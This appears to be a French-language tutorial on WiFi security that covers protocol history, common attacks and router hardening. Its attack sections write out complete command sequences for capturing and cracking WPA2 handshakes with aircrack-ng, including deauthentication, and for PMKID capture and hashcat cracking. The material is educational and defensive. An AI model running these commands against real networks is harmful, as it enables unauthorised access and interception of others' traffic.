# Sécurité WiFi : WPA2, WPA3 et attaques courantes

Le WiFi est omniprésent mais souvent mal sécurisé. Un réseau WiFi vulnérable peut permettre à un attaquant d'intercepter tout votre trafic, d'accéder à vos appareils et de voler vos données. Voici comment comprendre et sécuriser votre réseau sans fil.

## L'évolution des protocoles WiFi

### WEP (1997) — ⛔ Complètement cassé

WEP (Wired Equivalent Privacy) utilisait RC4 avec une clé statique. Il peut être cracké en **moins de 60 secondes** avec des outils modernes. Ne l'utilisez jamais.

### WPA (2003) — ⚠️ Obsolète

WPA introduisait TKIP pour corriger les failles de WEP. Également compromis, à éviter.

### WPA2 (2004) — ✅ Acceptable si bien configuré

WPA2 utilise AES-CCMP, nettement plus robuste. Encore largement utilisé. Vulnérable aux attaques par dictionnaire sur les mots de passe faibles et à KRACK (2017).

### WPA3 (2018) — ✅✅ Recommandé

WPA3 apporte des améliorations majeures :
- **SAE** (Simultaneous Authentication of Equals) remplace PSK — résistant aux attaques hors-ligne
- **Forward Secrecy** — une clé compromise ne compromet pas les sessions passées
- **Protection des réseaux ouverts** avec OWE (Opportunistic Wireless Encryption)

## Les attaques WiFi courantes

### 1. Attaque par dictionnaire / force brute

```bash
# Capture du handshake WPA2 avec aircrack-ng (sur réseau autorisé)

# 1. Passer la carte en mode monitor
airmon-ng start wlan0

# 2. Scanner les réseaux
airodump-ng wlan0mon

# 3. Capturer le handshake d'authentification
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. Forcer un client à se reconnecter (envoie des paquets deauth)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Cracker le handshake avec un dictionnaire
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

**Protection :** utilisez un mot de passe WiFi long et complexe (+20 caractères).

### 2. Evil Twin (Faux point d'accès)

L'attaquant crée un **faux réseau WiFi** avec le même nom (SSID) que le réseau légitime. Les appareils se connectent automatiquement au signal le plus fort.

```
Réseau légitime  : "CafeWifi" (signal 60%)
Faux réseau      : "CafeWifi" (signal 90%) ← Attaquant
                                                   ↓
                              Tout votre trafic passe par l'attaquant
```

**Protection :** utilisez toujours un VPN sur les WiFi publics.

### 3. KRACK (Key Reinstallation Attack)

Vulnérabilité dans le protocole WPA2 permettant de forcer la réinstallation de clés cryptographiques, exposant le trafic.

**Protection :** mettez à jour tous vos appareils (la plupart sont patchés depuis 2017).

### 4. PMKID Attack

Plus récente que KRACK, cette attaque permet de capturer un hash sans attendre qu'un client se connecte.

```bash
# Capture du PMKID (sans client nécessaire)
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Conversion pour hashcat
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Crackage
hashcat -m 22000 hash.hc22000 wordlist.txt
```

**Protection :** WPA3 ou mot de passe très long (+20 caractères).

### 5. Wardriving

Technique consistant à se déplacer (en voiture, à vélo) pour cartographier les réseaux WiFi vulnérables.

## Sécuriser votre réseau WiFi

### Configuration du routeur

```
✅ Utiliser WPA3 ou WPA2-AES (jamais TKIP)
✅ Mot de passe WiFi : 20+ caractères aléatoires
✅ Changer le mot de passe admin du routeur
✅ Désactiver WPS (vulnérable par design)
✅ Désactiver l'administration à distance
✅ Mettre à jour le firmware du routeur
✅ Désactiver UPnP si non nécessaire
```

### Séparer les réseaux

```
Réseau principal    : vos appareils de confiance
Réseau invités      : visiteurs (isolé du réseau principal)
Réseau IoT          : caméras, ampoules, thermostats
                      (isolé pour limiter la propagation)
```

### Exemple de mot de passe WiFi robuste

```bash
# Générer un mot de passe WiFi fort
openssl rand -base64 32
# Résultat : K7mP9xQ2nR5vL8wT3yU6jH4cF1bE0aD

# Ou avec Python
python3 -c "import secrets; print(secrets.token_urlsafe(24))"
# Résultat : xK9mP2nR5vL8wT3yU6jH4cF1
```

### Audit de votre réseau WiFi

```bash
# Scanner votre réseau pour trouver les appareils connectés
nmap -sn 192.168.1.0/24

# Vérifier la sécurité de votre WiFi
# https://www.wifi-inspector.com (en ligne)

# Avec wash (détecte les réseaux avec WPS activé)
wash -i wlan0mon
```

## Les bonnes pratiques sur les WiFi publics

```
Sur un WiFi public (café, hôtel, aéroport) :

✅ Utilisez un VPN (chiffre tout votre trafic)
✅ Vérifiez le nom exact du réseau auprès du personnel
✅ Préférez votre partage de connexion mobile
✅ Évitez les transactions bancaires
✅ Utilisez HTTPS partout (extension navigateur)

❌ Ne vous connectez jamais à votre banque sans VPN
❌ Ne téléchargez pas de fichiers
❌ Ne vous connectez pas à des services sensibles
```

## Analyse de trafic WiFi avec Wireshark

```bash
# Capturer le trafic sur votre propre réseau (légal)
sudo wireshark

# Filtres utiles dans Wireshark
http                    # Voir le trafic HTTP non chiffré
dns                     # Voir les requêtes DNS
tcp.port == 443         # Trafic HTTPS
arp                     # Voir la table ARP (détecter ARP spoofing)
```

## Conclusion

La sécurité WiFi repose sur trois piliers : **protocole moderne (WPA3)**, **mot de passe robuste**, et **segmentation du réseau**. Sur les réseaux publics, un VPN est indispensable. La majorité des attaques WiFi réussies exploitent des mots de passe faibles — c'est le premier point à corriger.